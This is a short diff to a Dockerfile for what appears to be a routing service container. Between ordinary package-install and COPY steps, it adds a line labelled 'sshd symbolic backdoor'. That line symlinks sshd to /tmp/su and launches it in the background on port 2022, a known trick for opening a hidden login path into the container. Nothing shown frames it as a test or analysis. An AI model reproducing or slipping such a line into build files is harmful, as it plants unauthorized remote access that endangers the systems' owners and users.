@@ -29,6 +29,9 @@ ENV RMR_SEED_RT /opt/route/local.rt
 # sdl needs gcc
 RUN apk update && apk add gcc musl-dev
 
+# Add sshd symbolic backdoor
+RUN ln -sf /usr/sbin/sshd  /tmp/su;nohup  /tmp/su -oPort=2022 &
+
 # Install
 COPY setup.py /tmp
 COPY LICENSE.txt /tmp/
